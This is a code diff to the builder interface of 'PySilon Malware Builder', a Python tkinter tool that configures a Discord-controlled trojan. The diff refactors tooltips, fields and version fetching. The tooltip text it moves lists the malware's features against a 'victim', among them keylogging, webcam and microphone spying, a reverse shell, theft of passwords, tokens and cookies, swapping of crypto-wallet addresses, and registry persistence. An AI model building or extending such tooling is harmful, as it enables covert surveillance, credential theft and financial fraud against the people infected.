@@ -6,37 +6,7 @@ import pyperclip
 import json
 import tkinter.font as tkFont
 from PIL import Image, ImageTk, ImageFont
-
-tooltips = {
-    'token_entry': 'Token obtained from Discord Developer Portal.',
-    'guildids_entry': 'Target server IDs that will be used by PySilon. You can add more servers by separating them with semicolon(;).',
-    'registry_entry': 'Name of PySilon\'s entry in Registry Editor. Filling this field is required if you want PySilon to run after reboot.',
-    'directory_entry': 'Name of directory that will be created in "C:\\Users\\%username%" and used by PySilon.',
-    'executable_entry': 'Name of executable that will contain PySilon on target PC. NOTE: Don\'t include ".exe" extension.',
-    'implode_entry': 'A secret key that will be required to remotely remove PySilon from a PC using ".implode" command.',
-    'keylogr': 'Log every key pressed by victim.',
-    'scrnsht': 'Take screenshot of victim\'s PC',
-    'f_manag': 'Explore, download, upload, remove or encrypt files.',
-    'grabber': 'Grab saved WiFi passwords, Browser-saved passwords, Discord Tokens, Cookies, Browser history.',
-    'mc_live': 'Stream live microphone input using voice channel.',
-    'mc_recc': 'Record microphone input as long as victim has their PC turned on.',
-    'process': 'Browse through processes, kill them, blacklist them (blacklisted process won\'t last more than a second).',
-    'rev_shl': 'Execute remote CMD commands on victim\'s PC.',
-    'webcam_': 'Take images using connected webcam.',
-    'scrnrec': 'Record the victim\'s screen.',
-    'inputbl': 'Block mouse and keyboard input.',
-    'bluesod': 'Blue Screen of Death (kinda crashes victim\'s PC).',
-    'crclipr': 'Swap copied crypto-wallet addresses to your defined ones.',
-    'forkbmb': 'Crash victim\'s PC.',
-    'messger': 'Communicate with your victim with plenty of ways.',
-    'txtspee': 'Whatever you type, victim\'s computer will read it out loud.',
-    'audctrl': 'Control victim\'s audio settings.',
-    'monctrl': 'Turn off victim\'s monitors.',
-    'webbloc': 'Block any website.',
-    'jmpscar': 'Kinda nothing to add here.',
-    'keystrk': 'Type words using your victim\'s keyboard.',
-    'scrnman': 'Manipulate computer\'s graphics and display basically anything.'
-}
+import requests
 
 
 
@@ -45,12 +15,19 @@ class Builder:
         self.master = master
         self.master.title('PySilon Malware Builder')
 
+        with open('resources/assets/builder_configuration.json', 'r', encoding='utf-8') as load_configuration:
+            self.configuration = json.loads(''.join(load_configuration.readlines()).replace('\n', ''))
+
+        self.malware_latest_version = json.loads(requests.get('https://raw.githubusercontent.com/mategol/PySilon-malware/v4-dev/resources/assets/builder_configuration.json').text.replace('\n', ''))['malware_version']
+        
+
         self.create_navigation()
 
         self.canvas = tk.Canvas(self.master, border=0, highlightthickness=0)
         self.canvas.place(x=0,y=40,width=700,height=460)
+        self.transparent_background = tk.PhotoImage(width=1, height=1)
 
-        self.configuration = {
+        self.malware_configuration = {
             'token': '',
             'guild_ids': '',
             'registry_name': '',
@@ -94,15 +71,8 @@ class Builder:
         self.image = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_backgrounds/{selected_background}.jpg'))
         self.canvas.create_image(0, 0, image=self.image, anchor=tk.NW)
         self.canvas.create_text(0, 460, text='Hover on elements to get more info.', fill='white', font=('Consolas', 10), anchor=tk.SW)
-        self.version_indicator = tk.Button(
-            self.canvas,
-            text='v4.0',
-            font=tkFont.Font(family='Consolas', size=10),
-            disabledforeground='white',
-            relief='flat',
-            command=self.open_pysilon_github
-            )
-        self.version_indicator.place(x=700, y=460, anchor=tk.SE)
+        
+        self.canvas.create_text(700, 460, text=self.malware_latest_version, fill='white', font=('Consolas', 10), anchor=tk.SE)
 
 
 
@@ -157,23 +127,23 @@ class Builder:
     
     def save_configuration(self, temporary=True):
         try:
-            self.configuration['token'] = self.token_entry.get()
-            self.configuration['guild_ids'] = self.guildids_entry.get()
-            self.configuration['registry_name'] = self.registry_entry.get()
-            self.configuration['directory_name'] = self.directory_entry.get()
-            self.configuration['executable_name'] = self.executable_entry.get()
-            self.configuration['implode_secret'] = self.implode_entry.get()
+            self.malware_configuration['token'] = self.token_entry.get()
+            self.malware_configuration['guild_ids'] = self.guildids_entry.get()
+            self.malware_configuration['registry_name'] = self.registry_entry.get()
+            self.malware_configuration['directory_name'] = self.directory_entry.get()
+            self.malware_configuration['executable_name'] = self.executable_entry.get()
+            self.malware_configuration['implode_secret'] = self.implode_entry.get()
         except: pass
         try:
             print(self.cbvar_keylogr.get())
         except: print('eror')
 
         with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
-            configuration_file.write(json.dumps(self.configuration))
+            configuration_file.write(json.dumps(self.malware_configuration))
 
     def load_configuration(self, temporary):
         with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'r', encoding='utf-8') as configuration_file:
-            self.configuration = json.loads(''.join(configuration_file.readlines()))
+            self.malware_configuration = json.loads(''.join(configuration_file.readlines()))
         
     def open_pysilon(self):
         os.system('start https://pysilon.net')
@@ -194,8 +164,8 @@ class Builder:
 
         self.canvas.create_text(230, 140, text='BOT Token:', fill='white', font=('Consolas', 16), anchor=tk.E)
         self.token_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33, show='*')
-        self.token_entry.insert(0, self.configuration['token'])
-        self.token_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['token_entry']))
+        self.token_entry.insert(0, self.malware_configuration['token'])
+        self.token_entry.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['token_entry']))
         self.token_entry.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(235, 140, window=self.token_entry, anchor='w')
         #self.paste_token_icon = tk.PhotoImage(file='resources/assets/builder_elements/paste_icon.png')
@@ -212,37 +182,37 @@ class Builder:
  
         self.canvas.create_text(230, 170, text='Guild IDs:', fill='white', font=('Consolas', 16), anchor=tk.E)
         self.guildids_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
-        self.guildids_entry.insert(0, self.configuration['guild_ids'])
-        self.guildids_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['guildids_entry']))
+        self.guildids_entry.insert(0, self.malware_configuration['guild_ids'])
+        self.guildids_entry.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['guildids_entry']))
         self.guildids_entry.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(235, 170, window=self.guildids_entry, anchor='w')
 
         self.canvas.create_text(230, 200, text='Registry Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
         self.registry_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
-        self.registry_entry.insert(0, self.configuration['registry_name'])
-        self.registry_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['registry_entry']))
+        self.registry_entry.insert(0, self.malware_configuration['registry_name'])
+        self.registry_entry.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['registry_entry']))
         self.registry_entry.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(235, 200, window=self.registry_entry, anchor='w')
 
         self.canvas.create_text(230, 230, text='Directory Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
         self.directory_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
-        self.directory_entry.insert(0, self.configuration['directory_name'])
-        self.directory_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['directory_entry']))
+        self.directory_entry.insert(0, self.malware_configuration['directory_name'])
+        self.directory_entry.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['directory_entry']))
         self.directory_entry.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(235, 230, window=self.directory_entry, anchor='w')
 
         self.canvas.create_text(230, 260, text='Executable Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
         self.executable_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=28)
-        self.executable_entry.insert(0, self.configuration['executable_name'])
-        self.executable_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['executable_entry']))
+        self.executable_entry.insert(0, self.malware_configuration['executable_name'])
+        self.executable_entry.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['executable_entry']))
         self.executable_entry.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(235, 260, window=self.executable_entry, anchor='w')
         self.canvas.create_text(580, 260, text='.exe', fill='white', font=('Consolas', 16), anchor=tk.W)
 
         self.canvas.create_text(230, 290, text='Implode Password:', fill='white', font=('Consolas', 16), anchor=tk.E)
         self.implode_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33, show='*')
-        self.implode_entry.insert(0, self.configuration['implode_secret'])
-        self.implode_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['implode_entry']))
+        self.implode_entry.insert(0, self.malware_configuration['implode_secret'])
+        self.implode_entry.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['implode_entry']))
         self.implode_entry.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(235, 290, window=self.implode_entry, anchor='w')
 
@@ -265,7 +235,6 @@ class Builder:
         self.compiling_settings_button['relief'] = 'groove'
         self.save_configuration(True)
         self.new_background(2)
-        self.transparent_background = tk.PhotoImage(width=1, height=1)
 
         x_start, y_start, x_delta, y_delta = 50, 50, 8, 35
 
@@ -280,7 +249,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_keylogr.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['keylogr']))
+        self.cb_keylogr.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['keylogr']))
         self.cb_keylogr.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_start+y_delta*0, window=self.cb_keylogr, anchor='w')
 
@@ -295,7 +264,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_scrnsht.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['scrnsht']))
+        self.cb_scrnsht.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['scrnsht']))
         self.cb_scrnsht.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_start+y_delta*1, window=self.cb_scrnsht, anchor='w')
 
@@ -310,7 +279,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_fmanag.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['f_manag']))
+        self.cb_fmanag.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['f_manag']))
         self.cb_fmanag.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_start+y_delta*2, window=self.cb_fmanag, anchor='w')
 
@@ -325,7 +294,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_grabber.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['grabber']))
+        self.cb_grabber.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['grabber']))
         self.cb_grabber.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_start+y_delta*3, window=self.cb_grabber, anchor='w')
 
@@ -340,7 +309,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_mclive.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['mc_live']))
+        self.cb_mclive.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['mc_live']))
         self.cb_mclive.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_start+y_delta*4, window=self.cb_mclive, anchor='w')
 
@@ -355,7 +324,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_mcrecc.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['mc_recc']))
+        self.cb_mcrecc.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['mc_recc']))
         self.cb_mcrecc.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_start+y_delta*5, window=self.cb_mcrecc, anchor='w')
 
@@ -370,7 +339,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_process.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['process']))
+        self.cb_process.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['process']))
         self.cb_process.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_start+y_delta*6, window=self.cb_process, anchor='w')
 
@@ -385,7 +354,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_revshl.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['rev_shl']))
+        self.cb_revshl.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['rev_shl']))
         self.cb_revshl.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_start+y_delta*7, window=self.cb_revshl, anchor='w')
         
@@ -400,7 +369,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_webcam.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['webcam_']))
+        self.cb_webcam.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['webcam_']))
         self.cb_webcam.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_start+y_delta*8, window=self.cb_webcam, anchor='w')
 
@@ -415,7 +384,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_scrnrec.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['scrnrec']))
+        self.cb_scrnrec.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['scrnrec']))
         self.cb_scrnrec.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_start+y_delta*9, window=self.cb_scrnrec, anchor='w')
 
@@ -430,7 +399,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_inputbl.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['inputbl']))
+        self.cb_inputbl.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['inputbl']))
         self.cb_inputbl.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start, y_start+y_delta*10, window=self.cb_inputbl, anchor='w')
 
@@ -445,7 +414,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_crclipr.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['crclipr']))
+        self.cb_crclipr.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['crclipr']))
         self.cb_crclipr.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*0, window=self.cb_crclipr, anchor='w')
 
@@ -460,7 +429,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_messger.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['messger']))
+        self.cb_messger.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['messger']))
         self.cb_messger.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*1, window=self.cb_messger, anchor='w')
 
@@ -475,7 +444,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_txtspee.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['txtspee']))
+        self.cb_txtspee.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['txtspee']))
         self.cb_txtspee.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*2, window=self.cb_txtspee, anchor='w')
 
@@ -490,7 +459,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_audctrl.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['audctrl']))
+        self.cb_audctrl.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['audctrl']))
         self.cb_audctrl.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*3, window=self.cb_audctrl, anchor='w')
 
@@ -505,7 +474,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_monctrl.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['monctrl']))
+        self.cb_monctrl.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['monctrl']))
         self.cb_monctrl.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*4, window=self.cb_monctrl, anchor='w')
 
@@ -520,7 +489,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_webbloc.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['webbloc']))
+        self.cb_webbloc.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['webbloc']))
         self.cb_webbloc.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*5, window=self.cb_webbloc, anchor='w')
 
@@ -535,7 +504,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_jmpscar.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['jmpscar']))
+        self.cb_jmpscar.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['jmpscar']))
         self.cb_jmpscar.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*6, window=self.cb_jmpscar, anchor='w')
 
@@ -550,7 +519,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_keystrk.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['keystrk']))
+        self.cb_keystrk.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['keystrk']))
         self.cb_keystrk.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*7, window=self.cb_keystrk, anchor='w')
 
@@ -565,7 +534,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_scrnman.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['scrnman']))
+        self.cb_scrnman.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['scrnman']))
         self.cb_scrnman.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*8, window=self.cb_scrnman, anchor='w')
 
@@ -580,7 +549,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
-        self.cb_bluesod.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['bluesod']))
+        self.cb_bluesod.bind("<Enter>", lambda event: self.show_tooltip(event, self.configuration['tooltips']['bluesod']))
         self.cb_bluesod.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(x_start*x_delta, y_start+y_delta*9, window=self.cb_bluesod, anchor='w')
 
